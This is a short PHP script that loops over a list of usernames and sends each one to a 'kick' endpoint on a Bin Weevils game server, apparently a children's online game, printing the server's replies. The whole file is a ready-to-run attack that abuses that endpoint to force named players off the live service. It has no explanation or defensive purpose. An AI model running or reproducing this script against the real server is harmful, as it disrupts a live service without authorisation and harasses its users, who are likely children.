<?php
$users = array("<usernames>");
foreach ($users as $weevil) { 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,"http://sfs2.binweevils.com/Crisp/REST/kick/" . $weevil . "/bye/0");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output=curl_exec($ch);
    echo $server_output;
    curl_close($ch);
}
?>